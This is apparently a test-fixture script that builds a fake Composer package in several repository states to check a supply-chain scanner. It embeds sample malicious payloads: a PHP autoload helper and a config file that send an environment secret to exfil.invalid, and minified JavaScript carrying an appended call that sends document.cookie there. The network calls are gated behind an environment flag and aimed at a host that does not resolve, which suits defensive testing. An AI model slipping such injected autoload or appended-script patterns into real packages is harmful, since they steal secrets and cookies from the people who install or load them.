"""Build the fake package vetlab/widget and publish a chosen state of the repository.

Usage: python3 build_repo.py <state>
  baseline  1.0.0 (clean), 1.0.1 (autoload.files injection), 1.1.0 (changes only outside autoload)
  rewrite   same as baseline, but 1.0.0 is re-tagged onto the injected code (the laravel-lang pattern)
  young     baseline + 1.3.0 published now with an honest date
  backdated young + 1.3.1 published now with a date in 2020
"""
import hashlib
import io
import json
import os
import sys
import zipfile
from datetime import datetime, timezone

ROOT = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.join(ROOT, 'repo')
BASE_URL = 'https://127.0.0.1:8443'
NOW = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S+00:00')
OLD = '2026-09-01T00:00:00+00:00'

MANIFEST = {
    'name': 'vetlab/widget',
    'description': 'Fake package for verifying laravel/vet',
    'type': 'library',
    'license': 'MIT',
    'autoload': {'psr-4': {'Vetlab\\Widget\\': 'src/'}},
}

WIDGET = """<?php

namespace Vetlab\\Widget;

final class Widget
{
    public function greet(string $name): string
    {
        return 'Hello, '.$name;
    }
}
"""

CONFIG_CLEAN = """<?php

return [
    'greeting' => 'Hello',
];
"""

# Loaded at runtime by a service provider in a real Laravel package, but not by any autoload rule.
CONFIG_EXFIL = """<?php

$token = (string) getenv('VETLAB_FAKE_SECRET');

if (getenv('VETLAB_LIVE') === '1') {
    @file_get_contents('https://exfil.invalid/c?t='.urlencode($token));
}

return [
    'greeting' => 'Hello',
];
"""

# Runs on every request once composer.json lists it in autoload.files (the laravel-lang payload shape).
# It only writes a marker next to vendor/; the network call is fenced off behind VETLAB_LIVE,
# and .invalid never resolves anyway.
HELPERS = """<?php

if (! function_exists('vetlab_locale')) {
    function vetlab_locale(): string
    {
        return 'en';
    }
}

(static function (): void {
    @file_put_contents(dirname(__DIR__, 4).'/payload-ran.txt', 'vetlab/widget src/helpers.php ran at '.date('c').PHP_EOL, FILE_APPEND);

    if (getenv('VETLAB_LIVE') !== '1') {
        return;
    }

    $secret = (string) getenv('VETLAB_FAKE_SECRET');

    @file_get_contents('https://exfil.invalid/collect', false, stream_context_create([
        'http' => ['method' => 'POST', 'content' => $secret, 'timeout' => 1],
    ]));
})();
"""


def minified_js(extra: str = '') -> str:
    body = ''.join('function f%d(a,b){return a*%d+b}' % (i, i) for i in range(560))
    return '(function(){' + body + '})();' + extra


JS_CLEAN = minified_js()
JS_EXFIL = minified_js(';(function(){try{new Image().src="https://exfil.invalid/c?d="+encodeURIComponent(document.cookie)}catch(e){}})();')


def files(injected: bool, inert_change: bool, readme: str) -> dict:
    manifest = json.loads(json.dumps(MANIFEST))
    tree = {
        'README.md': readme,
        'src/Widget.php': WIDGET,
        'config/widget.php': CONFIG_EXFIL if inert_change else CONFIG_CLEAN,
        'dist/widget.min.js': JS_EXFIL if inert_change else JS_CLEAN,
    }
    if injected:
        manifest['autoload']['files'] = ['src/helpers.php']
        tree['src/helpers.php'] = HELPERS
    tree['composer.json'] = json.dumps(manifest, indent=4) + '\n'
    return tree


VARIANTS = {
    # key: (version, reference seed, tree, time)
    'v1.0.0': ('1.0.0', 'v1.0.0', files(False, False, '# Widget\n'), OLD),
    'v1.0.0-rewritten': ('1.0.0', 'v1.0.0-rewritten', files(True, False, '# Widget\n'), OLD),
    'v1.0.1': ('1.0.1', 'v1.0.1', files(True, False, '# Widget\n\nAdds locale helpers.\n'), OLD),
    'v1.1.0': ('1.1.0', 'v1.1.0', files(False, True, '# Widget\n\nTidies the config.\n'), OLD),
    'v1.3.0': ('1.3.0', 'v1.3.0', files(False, False, '# Widget\n\n1.3.0\n'), NOW),
    'v1.3.1': ('1.3.1', 'v1.3.1', files(False, False, '# Widget\n\n1.3.1\n'), '2020-01-01T00:00:00+00:00'),
}

STATES = {
    'baseline': ['v1.0.0', 'v1.0.1', 'v1.1.0'],
    'rewrite': ['v1.0.0-rewritten', 'v1.0.1', 'v1.1.0'],
    'young': ['v1.0.0', 'v1.0.1', 'v1.1.0', 'v1.3.0'],
    'backdated': ['v1.0.0', 'v1.0.1', 'v1.1.0', 'v1.3.0', 'v1.3.1'],
}


def build_zip(key: str, tree: dict) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as archive:
        for path in sorted(tree):
            info = zipfile.ZipInfo('vetlab-widget-%s/%s' % (key, path), date_time=(2026, 9, 1, 0, 0, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            info.external_attr = 0o644 << 16
            archive.writestr(info, tree[path])
    return buffer.getvalue()


def publish(state: str) -> None:
    versions = {}
    for key in STATES[state]:
        version, seed, tree, time = VARIANTS[key]
        data = build_zip(key, tree)
        name = 'vetlab-widget-%s.zip' % key
        with open(os.path.join(REPO, 'dist', name), 'wb') as handle:
            handle.write(data)
        manifest = json.loads(tree['composer.json'])
        manifest.update({
            'version': version,
            'time': time,
            'dist': {
                'type': 'zip',
                'url': '%s/dist/%s' % (BASE_URL, name),
                'reference': hashlib.sha1(seed.encode()).hexdigest(),
                'shasum': hashlib.sha1(data).hexdigest(),
            },
        })
        versions[version] = manifest
    with open(os.path.join(REPO, 'packages.json'), 'w') as handle:
        json.dump({'packages': {'vetlab/widget': versions}}, handle, indent=2)
    print('published state [%s]: %s' % (state, ', '.join('%s@%s' % (v, m['time']) for v, m in versions.items())))


if __name__ == '__main__':
    publish(sys.argv[1] if len(sys.argv) > 1 else 'baseline')
